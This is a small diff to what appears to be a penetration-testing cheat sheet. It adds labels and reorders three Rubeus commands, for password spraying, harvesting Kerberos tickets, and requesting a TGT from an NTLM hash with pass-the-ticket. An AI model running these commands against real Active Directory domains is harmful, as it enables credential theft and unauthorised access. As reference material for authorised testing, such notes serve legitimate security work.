@@ -23,9 +23,15 @@ More - https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
 # Rubeus
 https://www.hackingarticles.in/a-detailed-guide-on-rubeus/
 
-```Rubeus.exe harvest /interval:30```
+Brute Password spray:
 
 ```Rubeus.exe brute /password:$PASSWORD /noticket```
+
+Get tickets on System:
+
+```Rubeus.exe harvest /interval:30```
+
+Request ticket (TGT) based on username and password/hash:
 
 ```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
 
